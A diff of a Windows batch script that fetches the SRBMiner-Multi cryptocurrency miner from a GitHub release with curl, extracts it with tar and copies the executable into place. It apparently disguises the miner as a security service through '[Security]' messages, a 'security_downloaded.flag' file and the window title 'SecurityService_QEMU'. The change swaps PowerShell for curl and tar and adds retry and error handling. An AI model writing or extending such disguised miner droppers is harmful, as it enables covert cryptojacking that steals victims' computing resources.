@@ -19,16 +19,30 @@ set FLAG=%BASE%\security_downloaded.flag
 set WINTITLE=SecurityService_QEMU
 
 REM =========================
-REM DOWNLOAD ONCE
+REM DOWNLOAD ONCE (NO POWERSHELL)
 REM =========================
 
 if exist "%FLAG%" goto SKIP_DOWNLOAD
 
 echo [Security] Downloading binary...
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-win64.zip' -OutFile '%ZIP%' -UseBasicParsing"
+
+curl -L --retry 5 --retry-delay 3 --fail ^
+  -o "%ZIP%" ^
+  https://github.com/doktor83/SRBMiner-Multi/releases/download/3.1.1/SRBMiner-Multi-3-1-1-win64.zip
+
+if not exist "%ZIP%" (
+    echo [ERROR] Download failed
+    exit /b 1
+)
 
 echo [Security] Extracting...
-powershell -Command "Expand-Archive -Force '%ZIP%' '%BASE%'"
+tar -xf "%ZIP%" -C "%BASE%"
+
+if not exist "%EXTRACT%\SRBMiner-MULTI.exe" (
+    echo [ERROR] Extraction failed
+    del /f /q "%ZIP%"
+    exit /b 1
+)
 
 copy /y "%EXTRACT%\SRBMiner-MULTI.exe" "%BIN%" >nul
 
